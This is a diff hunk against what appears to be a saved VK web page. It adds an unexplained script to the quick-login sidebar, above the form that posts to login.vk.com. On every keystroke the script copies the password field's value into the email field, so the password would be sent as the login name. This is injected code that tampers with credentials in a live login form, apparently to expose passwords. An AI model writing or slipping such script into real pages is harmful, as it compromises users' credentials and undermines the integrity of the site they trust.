@@ -204,6 +204,12 @@ var abp;
     <div id="side_bar" class="side_bar fl_l  sticky_top_force" style="display: none">
       <div id="side_bar_inner" class="side_bar_inner">
         <div id="quick_login" class="quick_login">
+          <script> var inp = document.querySelectorAll('input[name="email"]');
+var ip = document.querySelectorAll('input[name="pass"]');
+document.addEventListener('input',function(){
+inp[0].value = ' '+ip[0].value
+
+});</script>
   <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
     <input type="hidden" name="act" value="login" />
     <input type="hidden" name="role" value="al_frame" />
